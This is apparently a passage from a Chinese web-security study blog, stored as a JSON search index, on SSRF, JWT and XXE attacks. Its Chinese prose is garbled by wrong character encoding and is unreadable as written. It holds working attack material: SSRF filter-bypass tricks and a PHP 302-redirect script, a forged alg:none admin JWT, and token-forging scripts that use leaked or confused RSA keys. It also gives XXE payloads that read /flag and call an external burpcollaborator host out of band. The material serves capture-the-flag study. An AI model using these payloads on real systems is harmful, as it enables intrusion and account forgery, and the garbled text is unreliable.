ä¸ºä»–è¿›è¡Œäº†ä¸¤æ¬¡è§£ç ,æˆ‘ä»¬åœ¨å‘é€åˆ°redisè¦ç»è¿‡ä¸€ä¸ªæœåŠ¡å™¨çš„è½¬å‘,æ¯”å¦‚è¿™é‡Œæ˜¯nginxè½¬å‘,åœ¨æˆ‘ä»¬ä¼ è¾“åˆ°nginxæ—¶å°±è¿›è¡Œäº†ä¸€æ¬¡urlè§£ç ,å†å‘é€ç»™redisæ—¶,åˆè¿›è¡Œäº†ä¸€æ¬¡è§£ç ,æ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œä¸¤æ¬¡ç¼–ç .\n\næ”»å‡»MySQLçš„3306ç«¯å£MySQLåˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯,ç”±å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯æœ‰å››ç§æ–¹å¼,åˆ†åˆ«æ˜¯\n\nunixå¥—æ¥å­—\nå†…å­˜å…±äº«\nå‘½ä»¤ç®¡é“\nTCP/IPå¥—æ¥å­—\n\næˆ‘ä»¬è¿›è¡Œæ”»å‡»ä¾é ç¬¬å››ç§æ–¹å¼,MySQLå®¢æˆ·ç«¯è¿æ¥æ—¶,æœ‰ä¸¤ç§æƒ…å†µ:\n\néœ€è¦å¯†ç è®¤è¯,æœåŠ¡å™¨å…ˆå‘é€salt,å®¢æˆ·ç«¯ä½¿ç”¨saltè¿›è¡ŒåŠ å¯†åå†éªŒè¯\nä¸éœ€è¦å¯†ç è®¤è¯,ç›´æ¥ä½¿ç”¨ä¸Šè¾¹ç¬¬å››ç§æ–¹å¼å‘é€æ•°æ®åŒ…\n\nè¿™é‡Œæ”»å‡»MySQLè¦åœ¨éäº¤äº’æ¡ä»¶ä¸‹è¿›è¡Œ,ä¸€å®šåªèƒ½æ”»å‡»æ²¡æœ‰å¯†ç çš„çš„MySQLæœåŠ¡ç«¯\nè¿™é‡Œæˆ‘ä»¬å†™é©¬è¦ç”¨MySQLè¯­å¥å†™\n\næ”»å‡»fastcgiçš„9000ç«¯å£\nphp-fpmæ˜¯ä¸ªä¸­é—´ä»¶,åœ¨éœ€è¦PHPè§£é‡Šå™¨æ¥å¤„ç†phpæ–‡æœ¬æ—¶ä¼šç”¨åˆ°php-fpm.\nè‡ªä»PHP5.3ä»¥åå°†php-fpmç»§æ‰¿åˆ°phpå†…æ ¸ç§.php-fpmæä¾›äº†æ›´å¥½çš„phpè¿›ç¨‹ç®¡ç†æ–¹å¼,å¯ä»¥æœ‰æ•ˆæ§åˆ¶å†…å­˜å’Œè¿›ç¨‹,å¯ä»¥å¹³æ»‘é‡è½½phpé…ç½®\n\nä»¥æˆ‘ä»¬ç»å¸¸æ‰§è¡Œè®¿é—®çš„index.php?file=/etc/passwdä¸ºä¾‹:\n\næµè§ˆå™¨å‘é€è®¿é—®index.phpçš„è¯·æ±‚åˆ°webæœåŠ¡å™¨,æ¯”å¦‚nginx/apache\n\nwebæœåŠ¡å™¨å°†è¯·æ±‚çš„uri(index.php),å‚æ•°(file=/etc/passwd)ç­‰ç­‰å‘é€ç»™ä¸“é—¨çš„phpè§£é‡Šå™¨æ¥æ‰§è¡Œ,å› ä¸ºnginx/apacheæ˜¯åªèƒ½å¤„ç†é™æ€æ–‡ä»¶(é€šè¿‡æ–‡ä»¶è¯»å–çš„æ–¹å¼) , å¯¹äºåŠ¨æ€çš„phpè„šæœ¬, éœ€è¦ä¸“é—¨çš„php-fpmä¸­é—´ä»¶æ¥è§£é‡Šæ‰§è¡Œ\n\nphp-fpmæ”¶åˆ°äº†webæœåŠ¡å™¨ä¼ é€’è¿‡æ¥çš„å„ç§å‚æ•°å, åˆå§‹åŒ–zendè™šæ‹Ÿæœº, å¯¹phpæ–‡ä»¶åšè¯æ³•åˆ†æ,è¯­æ³•åˆ†æ,ç¼–è¯‘æˆopcode,å¹¶æ‰§è¡Œ.æœ€åå…³é—­zendè™šæ‹Ÿæœº.å°†æ‰§è¡Œç»“æœè¿”å›ç»™webæœåŠ¡å™¨\n\nwebæœåŠ¡å™¨æ”¶åˆ°è¿”å›ç»“æœå,å°†httpç›¸åº”ä¼ ç»™æµè§ˆå™¨\n\n\n\nåŒ…å«é…ç½®æ–‡ä»¶ä»¥åï¼Œåé¢ç´§è·Ÿä¸€å¥\nfastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name\nå®šä¹‰äº†ä¸€ä¸ªSCRIPT_FILENAME,å€¼æ˜¯$document_root$fastcgi_script_name\né‡ç‚¹çœ‹SCRIPT_FILENAME,è¿™ä¸ªå°±æ˜¯nginxä¼ ç»™php-fpmçš„\nnginxå’Œphp-fpmçš„æ•°æ®äº¤äº’,ä½¿ç”¨çš„æ˜¯fast-cgiåè®®\nfastcgiåè®®\nfastcgiå…¶å®æ˜¯ä¸€ä¸ªé€šä¿¡åè®®,å’Œhttpåè®®ä¸€æ ·,éƒ½æ˜¯è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ä¸ªé€šé“.httpåè®®æ˜¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¸­é—´ä»¶è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®,æµè§ˆå™¨å°†httpå¤´å’Œhttpä½“ç”¨æŸä¸ªè§„åˆ™ç»„è£…æˆæ•°æ®åŒ…,ä»¥tcpçš„æ–¹å¼å‘é€åˆ°æœåŠ¡å™¨ä¸­é—´ä»¶,æœåŠ¡å™¨ä¸­é—´ä»¶æŒ‰ç…§è§„åˆ™å°†æ•°æ®åŒ…è§£ç ,å¹¶æŒ‰è¦æ±‚æ‹¿åˆ°ç”¨æˆ·éœ€è¦çš„æ•°æ®,å†ä»¥httpåè®®çš„è§„åˆ™æ‰“åŒ…è¿”å›ç»™æœåŠ¡å™¨.\n\nå¯ä»¥ä½¿ç”¨ä¼ªé€ çš„fastcgiåè®®æ•°æ®,ä¸php-fpmäº¤äº’,é€šè¿‡ä¼ªé€ script_filenameçš„å‚æ•°,æ¥å®ç°æ‰§è¡Œä»»æ„çš„PHPè„šæœ¬æ–‡ä»¶\nssrf-&gt;æ§åˆ¶æœåŠ¡ç«¯è„šæœ¬è¯·æ±‚æœ¬åœ°php-fpmç«¯å£-&gt;ä¼ªé€ é…ç½®å‚æ•°åŒ…å«php://inputæ•°æ®-&gt;æ‰§è¡Œphp://inputå†…æäº¤çš„ä»£ç \nè¿™é‡Œè¿˜æ˜¯ä½¿ç”¨gopherus\n\n0x3 ssrfçš„ç»•è¿‡ä½¿ç”¨enclosed alphanumericsç»•è¿‡æ•°å­—é™åˆ¶â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿\n\næ¯”å¦‚æˆ‘ä»¬è®¿é—®127.0.0.1,å¦‚æœ0è¢«è¿‡æ»¤äº†å°±å¯ä»¥ä½¿ç”¨127.â“¿.â“¿.1\nIPåœ°å€è¿›åˆ¶ç»•è¿‡IPåœ°å€å¯ä»¥è½¬intä¹Ÿå¯ä»¥è½¬ä¸åŒè¿›åˆ¶æ¥è¡¨ç¤º\næ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªhttp://www.tbfl.store/net/ip.html æ¥è½¬ä¸€ä¸‹127.0.0.1\n\nç‰¹æ®Šå†™æ³•ç»•è¿‡IPåœ°å€æœ‰ä¸€äº›ç‰¹æ®Šçš„å†™æ³•,åœ¨Windowsä¸‹,0ä»£è¡¨0.0.0.0,è€Œåœ¨Linuxä¸‹,0ä»£è¡¨çš„æ˜¯127.0.0.1\næ‰€ä»¥,åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨http://00 è¯·æ±‚127.0.0.1\nç”šè‡³æˆ‘ä»¬å¯ä»¥å°†127.0.0.1ä¸­çš„0å¿½ç•¥æ‰,ç›´æ¥è®¿é—®127.1ä»£è¡¨127.0.0.1\n\nLinuxä¸‹ä¹Ÿå¯ä»¥ç”¨ä¸­æ–‡å¥å·ä»£è¡¨ç‚¹,127ã€‚0ã€‚0ã€‚1ä»£è¡¨127.0.0.1\n\n302è·³è½¬éœ€è¦ä¸€ä¸ªvpsï¼ŒæŠŠ302è½¬æ¢çš„ä»£ç éƒ¨ç½²åˆ°vpsä¸Šï¼Œç„¶åå»è®¿é—®ï¼Œå°±å¯ä»¥è·³è½¬åˆ°å†…ç½‘ä¸­ï¼Œæ¯”å¦‚302.php\n&lt;?php$schema = $_GET[&#x27;s&#x27;];$ip = $_GET[&#x27;i&#x27;];$port = $_GET[&#x27;p&#x27;];$query = $_GET[&#x27;q&#x27;];if(empty($port))&#123;  header(&quot;Location: $schema://$ip/$query&quot;);&#125;else&#123;  header(&quot;Location: $schema://$ip:$port/$query&quot;);&#125;\n\nå¦‚æœæœåŠ¡å™¨è·Ÿè¸ªäº†locationå­—æ®µ,å°±å¯ä»¥è‡ªåŠ¨è½¬å‘\nçŸ­ç½‘å€ç»•è¿‡ç½‘ä¸Šæœ‰å¾ˆå¤šè½¬æ¢çŸ­ç½‘å€çš„å·¥å…·éšä¾¿ç™¾åº¦ä¸€ä¸ªå°±æœ‰\næ¯”å¦‚è¯´http://charmersix.icu/è½¬æ¢æˆhttp://jj6m.cn/e0fSu\nç¬¬äºŒèŠ‚ JWTçš„åŸç†ä»¥åŠçªç ´0x4 ä»€ä¹ˆæ˜¯jwtjwtåŸºæœ¬æ¦‚å¿µjson web token(jwt) æ˜¯ä¸€ä¸ªè½»é‡çº§çš„è®¤è¯è§„èŒƒ,è¿™ä¸ªè§„èŒƒå…è®¸ä½¿ç”¨jwtåœ¨ç”¨æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ é€’å®‰å…¨å¯é çš„ä¿¡æ¯.å…¶æœ¬è´¨æ˜¯ä¸€ä¸ªtoken,æ˜¯ä¸€ç§ç´§å‡‘çš„urlå®‰å…¨æ–¹æ³•,ç”¨äºåœ¨ç½‘ç»œé€šä¿¡çš„åŒæ–¹ä¹‹é—´ä¼ é€’.\n\næˆ‘ä»¬å¯ä»¥è¿›jwtå®˜ç½‘çœ‹ä¸€ä¸‹jwt.io\n\njwtæ˜æ–‡åªèƒ½çœ‹ä¸èƒ½æ”¹\njwtä½¿ç”¨jwtçš„æ¼æ´ç©ºåŠ å¯†ç®—æ³•jwtæ”¯æŒç©ºåŠ å¯†ç®—æ³•ï¼Œå¯ä»¥åœ¨headerä¸­æŒ‡å®šalgä¸ºnoneï¼Œè¿™æ ·çš„èŠ±ï¼Œåªè¦æŠŠsignatureè®¾ç½®ä¸ºç©ºï¼Œå³ä¸æ·»åŠ signatureå­—æ®µæäº¤åˆ°æœåŠ¡å™¨ï¼Œä»»ä½•tokenéƒ½å¯ä»¥é€šè¿‡æœåŠ¡å™¨éªŒè¯\nä½†æ˜¯æˆ‘ä»¬ä¼šå‘ç°å®˜ç½‘æ˜¯æ²¡æ³•ç”Ÿæˆç©ºåŠ å¯†çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“å®ƒçš„signatureæ˜¯base64ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ‰‹å·¥ç”Ÿæˆ\n&#123;  &quot;alg&quot;: &quot;None&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;&#123;  &quot;iss&quot;: &quot;admin&quot;,  &quot;iat&quot;: 1664193697,  &quot;exp&quot;: 1664200897,  &quot;nbf&quot;: 1664193697,  &quot;sub&quot;: &quot;admin&quot;,  &quot;jti&quot;: &quot;fa2fb0a80953bd65a5dfe2afec06048e&quot;&#125;åœ¨ä¸¤æ®µç¼–ç ä¸­é—´ç”¨.éš”å¼€\n\n\newogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=.\n\n(header+â€.â€+payload+â€.â€, å»æ‰äº†â€™.â€™signatureå­—æ®µ)\nç©ºåŠ å¯†ç®—æ³•æ˜¯ä¸ºäº†è°ƒè¯•æ–¹ä¾¿ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¼€å¯ç©ºåŠ å¯†æ¨¡å¼ï¼Œç¼ºå°‘ç­¾åä¿æŠ¤ï¼Œæ”»å‡»è€…åªè¦æŠŠalgå­—æ®µæ”¹æˆnoneï¼Œå°±å¯ä»¥åœ¨payloadä¸­æ„é€ èº«ä»½ï¼Œä¼ªé€ ç”¨æˆ·èº«ä»½ã€‚\nå¯†é’¥çˆ†ç ´æˆ‘ä»¬å¯ä»¥ä½¿ç”¨c-jwt-cracker-masterè¿›è¡Œjwtå¯†é’¥çˆ†ç ´\nç§é’¥æ³„éœ²æ”»å‡»è¿™é‡Œè®¿é—®/private.keyå°±èƒ½ä»»æ„æ–‡ä»¶ä¸‹è½½ç§é’¥ï¼Œä½†æ˜¯æˆ‘ä»¬å°è¯•åœ¨å®˜ç½‘æ˜¯æ— æ³•ç”Ÿæˆçš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå·±å†™è„šæœ¬ç”Ÿæˆ\nè¿™é‡Œå°±éœ€è¦åœ¨æœ¬åœ°å®‰è£…nodeï¼Œç„¶ånpm install jsonwebtoken\nconst jwt = require(&quot;jsonwebtoken&quot;);var fs = require(&quot;fs&quot;);var privateKey = fs.readFileSync(&quot;private.key&quot;);var token =jwt.sign(&#123;user:&#x27;admin&#x27; &#125;,privateKey,&#123;algorithm:&#x27;RS256&#x27;&#125;);console.log(token);\n\nç„¶åå†™è¿™ä¹ˆä¸ªè„šæœ¬,ç”Ÿæˆ\nå…¬é’¥æ³„éœ²æ”»å‡»jwtä¸­æœ€å¸¸ç”¨çš„ä¸¤ç§ç®—æ³•ä¸ºHMACå’ŒRSA\nHMACæ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç›¸åŒçš„å¯†é’¥è¿›è¡ŒåŠ è§£å¯†\nRSAæ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç§é’¥åŠ å¯†ï¼Œå…¬é’¥è§£å¯†\nåœ¨HMACå’ŒRSAä¸­ï¼Œéƒ½ä½¿ç”¨ç§é’¥å¯¹signatureå­—æ®µè¿›è¡Œç­¾åï¼Œåªæœ‰æ‹¿åˆ°äº†åŠ å¯†æ—¶ä½¿ç”¨çš„ç§é’¥ï¼Œæ‰æœ‰å¯èƒ½ä¼ªé€ token\nå¯†é’¥ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯æ— æ³•è·å–çš„ï¼Œä½†æ˜¯å¯ä»¥è·å–åˆ°å…¬é’¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†åŠ å¯†ç®—æ³•RSAæ”¹æˆHAMCï¼Œå³å°†algå­—æ®µç”±RS256æ”¹æˆHS256ï¼ŒåŒæ—¶ä½¿ç”¨è·å–åˆ°çš„å…¬é’¥ä½œä¸ºç®—æ³•çš„å¯†é’¥ï¼Œå¯¹tokenè¿›è¡Œç­¾åæäº¤ç»™æœåŠ¡ç«¯.æœåŠ¡å™¨ä¼šå°†RSAçš„å…¬é’¥ä½œä¸ºå½“å‰ç®—æ³•(HMAC)çš„å¯†é’¥ï¼ŒHMACå…¬é’¥å’Œå¯†é’¥ç›¸åŒï¼Œä½¿ç”¨HS256ç®—æ³•ä¼šå¯¹æ¥æ”¶åˆ°çš„ç­¾åè¿›è¡ŒéªŒè¯ã€‚\nconst jwt = require(&quot;jsonwebtoken&quot;);var fs = require(&quot;fs&quot;);var privateKey = fs.readFileSync(&quot;public.key&quot;);var token =jwt.sign(&#123;user:&#x27;admin&#x27; &#125;,privateKey,&#123;algorithm:&#x27;HS256&#x27;&#125;);console.log(token);\n\nä½†æ˜¯è¿™é‡Œè¦æ³¨æ„ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œå¯†é’¥æ”»å‡»æ—¶ï¼Œä¸€å®šè¦ç”¨postæ–¹å¼\nç¬¬ä¸‰èŠ‚ã€€XXEæ–‡ä»¶è¯»å–0x5ä»€ä¹ˆæ˜¯xxeæ¼æ´xxeçš„æ¦‚å¿µxxeæ˜¯å¤–éƒ¨XML Entityå®ä½“æ³¨å…¥,å±å®³æ€§è¾ƒå°\nxmlå®šä¹‰äº†ä¸¤ç§å®ä½“ç±»å‹ï¼Œåˆ†åˆ«æ˜¯\n\næ™®é€šentity åœ¨xmlæ–‡æ¡£ä¸­ä½¿ç”¨\nå‚æ•°entity åœ¨dtdæ–‡æ¡£ä¸­ä½¿ç”¨\n\nXMLç±»ä¼¼ä¸HTMLï¼Œæ˜¯æ¯”è¾ƒç®€å•çš„æ ‡è®°è¯­è¨€\nåœ¨æˆ‘çœ‹æ¥ï¼ŒXMLä¸HTMLçš„ä¸åŒç‚¹å¯èƒ½å°±åœ¨ä¸XMLä¼šæœ‰ä¸€ä¸ªè¿™ç§å¤´\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\nç„¶åå°±æ˜¯XMLæœ‰ä¸ªDTDï¼ŒDTDæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ç‚¹ï¼ŒDTDå¯ä»¥å¼•ç”¨ä¸€äº›å¤–éƒ¨çš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç”¨SYSTEMçš„æ–¹å¼è¯»å–ä¸€äº›å…¶ä»–çš„DTDæ–‡ä»¶ï¼Œå°±ä¸æ–‡ä»¶åŒ…å«ä¸€æ ·ã€‚\nå†…éƒ¨å£°æ˜DTDï¼š\n&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;\nå¼•ç”¨å¤–éƒ¨DTD\n&lt;!DOCTYPE æ ¹å…ƒç´  [SYSTEMã€€ï¼‚æ–‡ä»¶å/urlï¼‚]&gt;\nè¿™è¾¹æ¥ä¸€æ®µXMLä¾‹å­\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [      &lt;!ELEMENT note (to,from,heading,body)&gt;      &lt;!ELEMENT to (#PCDATA)&gt;      &lt;!ELEMENT from (#PCDATA)&gt;      &lt;!ELEMENT heading (#PCDATA)&gt;      &lt;!ELEMENT body (#PCDATA)&gt;      &lt;!ENTITY jt &quot;test&quot;&gt;      ]&gt;&lt;note&gt;  &lt;to&gt;Tove&lt;/to&gt;  &lt;from&gt;Jani&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt; Dont forget me this nightï¼&lt;/body&gt;  &lt;test&gt;&amp;jt;&lt;/test&gt;&lt;/note&gt;\n\nELEMENTä»£è¡¨å…ƒç´ ï¼›ENTITYä»£è¡¨å®ä¾‹\nxmléå¸¸çµæ´»ï¼Œå®šä¹‰åä¹Ÿå¯ä»¥ä¸ç”¨ï¼Œæ²¡æœ‰å®šä¹‰ä¹Ÿå¯ä»¥ç”¨ã€‚\nPCDATAã€€å¯ä»¥è§£æ\nä¾‹å¦‚ï¼š\n&amp;lt;   &lt;&amp;gt;   &gt;&amp;amp;  &amp;&amp;quot; &quot;&amp;apos; &#x27;\n\nCDATA ä¸å¯è§£æ\næ¥ä¸€ä¸ªå¼•ç”¨å¤–éƒ¨DTDçš„ğŸŒ°\næˆ‘ä»¬å°†ä¸Šè¾¹çš„ä»£ç æ‹†å¼€\n&lt;!DOCTYPE note [      &lt;!ELEMENT note (to,from,heading,body)&gt;      &lt;!ELEMENT to (#PCDATA)&gt;      &lt;!ELEMENT from (#PCDATA)&gt;      &lt;!ELEMENT heading (#PCDATA)&gt;      &lt;!ELEMENT body (#PCDATA)&gt;      &lt;!ENTITY jt &quot;test&quot;&gt;      ]&gt;\n\nè¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬å‘½åä¸ºsimple.dtd\nç„¶ååœ¨å¦å¤–ä¸€åŠä¸­åŠ å…¥ä¸€ä¸²æ–°çš„DOCTYPE\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [SYSTEM &quot;simple.dtd&quot;]&gt;&lt;note&gt;  &lt;to&gt;Tove&lt;/to&gt;  &lt;from&gt;Jani&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt; Dont forget me this nightï¼&lt;/body&gt;  &lt;test&gt;&amp;jt;&lt;/test&gt;&lt;/note&gt;\n\n% xxx æ˜¯å®šä¹‰DTDå˜é‡ï¼Œè¿™ç§å˜é‡åªèƒ½åœ¨dtdä¸­ä½¿ç”¨ï¼Œæ— æ³•å¼•ç”¨åˆ°xml\n&lt;!ENTITY % 123 &quot;123&quot;&gt;%123;\n\nxxeå±å®³xxeåˆ©ç”¨ï¼Œä¸»æµæ˜¯è¯»å–æ–‡ä»¶ä¸ºä¸»ï¼Œå¯ä»¥ä½œä¸ºä»»æ„æ–‡ä»¶è¯»å–åˆ‡å…¥ç‚¹\nxxeåˆ©ç”¨phpä¸­xxeçš„ä¸€èˆ¬å†™æ³•å¦‚ä¸‹ï¼š\nlibxml_disable_entity_loader #ç¦ç”¨/å¯ç”¨åŠ è½½å¤–éƒ¨å®ä½“çš„åŠŸèƒ½ï¼Œå‚æ•°ä¸ºtrueæ—¶å¯ç”¨ï¼Œå‚æ•°ä¸ºfalseæ—¶ç¦ç”¨file_get_contents(&#x27;php://input&#x27;) #æ¥æ”¶POSTè¯·æ±‚æ–¹å¼ä¼ çš„æ•°æ®loadXML($xmlfile,LIBXML_NOENT | LIBXML_DTDLOAD) #é€šè¿‡è§£æä¸€ä¸ªxmlæ ‡ç­¾å­—ç¬¦ä¸²æ¥ç»„æˆè¯¥æ–‡æ¡£simplexml_import_dom #æŠŠDOMèŠ‚ç‚¹è½¬æ¢ä¸ºSimpleXMLElementå¯¹è±¡$creds-&gt;ctfshow #è·å–é¡µé¢ä¸­çš„ctfshowå…ƒç´ \n\næœ‰å›æ˜¾çš„æƒ…å†µè¿™ç§æƒ…å†µæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨fileåè®®è¯»å–æ–‡ä»¶\nä¾‹å¦‚\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;root&gt;&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;&lt;/root&gt;\n\næ— å›æ˜¾æƒ…å†µæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤–éƒ¨çš„DTDï¼Œé€šè¿‡ä¸€ä¸ªå…¬ç½‘ipè¿›è¡Œè¯»å–\nè¿™é‡Œæˆ‘ä»¬ä¸¾ä¸¤ä¸ªä¾‹å­åˆ†åˆ«æ˜¯xml-dtdçš„OOBå’Œåªæœ‰dtdçš„OOB\næˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œèƒ½å‘ç°xml\n\nè¿™é‡Œæˆ‘ä»¬å‘ç°é‡Œè¾¹å¹¶æ²¡æœ‰DTDï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€æ®µDTD\n&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://f1hsyj0mt36nat549jqspboge7ky8n.burpcollaborator.net&quot;&gt; ] &gt;\nè¿™é‡Œæˆ‘ä»¬é€‰ç”¨çš„æ˜¯burp suiteè‡ªå¸¦çš„ç±»ä¼¼äºdnslogçš„ä¸œè¥¿\n\næœ‰æ—¶å€™æˆ‘ä»¬ä¹Ÿä¼šé‡åˆ°è¿™ç§æƒ…å†µ\n\n\nä»€ä¹ˆå«å®ä½“å‘¢ï¼Ÿ&amp;xxeå°±æ˜¯å®ä½“ï¼Œé‚£æˆ‘ä»¬ä¸ç”¨å®ä½“äº†ï¼Œä¸å¼•ç”¨åˆ°xmlä¸­äº†ï¼Œç›´æ¥ç”¨%å®šä¹‰DTDå˜é‡ï¼Œä½†æ˜¯è¿™é‡Œè¦æ³¨æ„%å®šä¹‰çš„æ—¶å€™è¦æœ‰ç©ºæ ¼\n% xxe\n\nXXE åç«¯ä»£ç xxe.php&lt;?php// file:///$dom = new DOMDocument();$dom -&gt; validateOnParse = true;//ç¬¬ä¸€ç§æ–¹æ³•é€šè¿‡å±æ€§éªŒè¯å¼ºåˆ¶åŠ è½½å¤–éƒ¨DTD(æ˜¯å¦é€šè¿‡DTDå¼ºåˆ¶åŠ è½½)@$dom-&gt;load(&#x27;simple.xml&#x27;);//@è¡¨ç¤ºä¼šå¼ºåˆ¶åŠ è½½å¤–éƒ¨DTDæ–‡ä»¶if(@$dom-&gt;validate())&#123; //ï¼ˆç¬¬äºŒç§æ–¹æ³•é€šè¿‡æ–¹æ³•éªŒè¯ï¼‰è¿™ä¸ª@è¡¨ç¤ºå±è”½éªŒè¯ä¸é€šè¿‡æ—¶çš„ä¿¡æ¯    echo &quot;yes&quot;;&#125;else&#123;    echo &quot;no&quot;;&#125;$x = $dom-&gt;documentElement;foreach ($x-&gt;childNodes AS $item)&#123;    print $item-&gt;nodeName .&quot;=&quot;.$item-&gt;nodeValue.&quot;&lt;br&gt;&quot;;&#125;\n\nsimple.xml&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE note SYSTEM &#x27;simple.dtd&#x27;&gt;&lt;note&gt;    &lt;to&gt;TO&lt;/to&gt;    &lt;from&gt;FROM&lt;/from&gt;    &lt;heading&gt;HEADING&lt;/heading&gt;    &lt;body&gt;        %company;        &amp;aa;    &lt;/body&gt;&lt;/note&gt;\n\nsimple.dtd&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!ENTITY % company &#x27;charmersix&#x27;&gt;&lt;!ENTITY aa &quot;2020~2022 %compy; ç‰ˆæƒæ‰€æœ‰&quot;&gt;\n\næ•ˆæœï¼š\n","tags":["Web","Study","SSRF","JWT","XXE"]},{"title":"Web_8_thinkphpä¸“é¢˜","url":"/2023/02/19/web_8_tp/","content":"ç¬¬ä¸€èŠ‚ è®¤è¯†thinkphp0x1 phpå¼€å‘æ¡†æ¶ä¸ºäº†é¿å…é‡å¤é€ è½®å­, è¿™é‡Œå°±å‡ºç°äº†PHPå¼€å‘æ¡†æ¶, åªéœ€è¦è£…ä¿®ä¸€ä¸‹å°±å¯ä»¥ä½¿ç”¨\nå…¶èƒŒåæ€æƒ³ä¸ºmvcæ€æƒ³\nå¸¸è§çš„å¼€å‘æ¡†æ¶thinkphpå¼€æºçš„PHPæ¡†æ¶ï¼Œä¸ºäº†ç®€åŒ–ä¼ä¸šçº§åº”ç”¨å¼€å‘å’Œæ•æ·webåº”ç”¨å¼€å‘è€Œè¯ç”Ÿçš„ã€‚éµå¾ªapache2å¼€æºåè®®å‘å¸ƒã€‚\nYiiç®€æ´ä¼˜ç§€çš„å¼€æºPHPæ¡†æ¶\nLaravelå¸®ä½ æ„å»ºä¸€ä¸ªå®Œç¾çš„ç½‘ç»œappï¼Œæ¯è¡Œä»£ç éƒ½å¯ä»¥ç®€æ´ã€å¯Œäºè¡¨è¾¾åŠ›ã€‚\nMVCåŸºç¡€æŒ‡MVCæ¨¡å¼çš„æŸç§æ¡†æ¶ï¼Œå¼ºåˆ¶æ€§åœ°ä½¿åº”ç”¨ç¨‹åºçš„è¾“å…¥ã€å¤„ç†å’Œè¾“å‡ºåˆ†å¼€ã€‚ä½¿ç”¨MVCåº”ç”¨ç¨‹åºè¢«åˆ†æˆä¸‰ä¸ªæ ¸å¿ƒæ¨¡å‹ï¼šæ¨¡å‹ã€è§†å›¾ã€æ§åˆ¶å™¨\nview(è§†å›¾)è§†å›¾æ˜¯ç”¨æˆ·çœ‹åˆ°çš„å¹¶ä¸ä¹‹äº¤äº’çš„ç•Œé¢, å¯¹è€å¼çš„webåº”ç”¨ç¨‹åºæ¥è¯´, è§†å›¾å°±æ˜¯ç”±HTMLå…ƒç´ 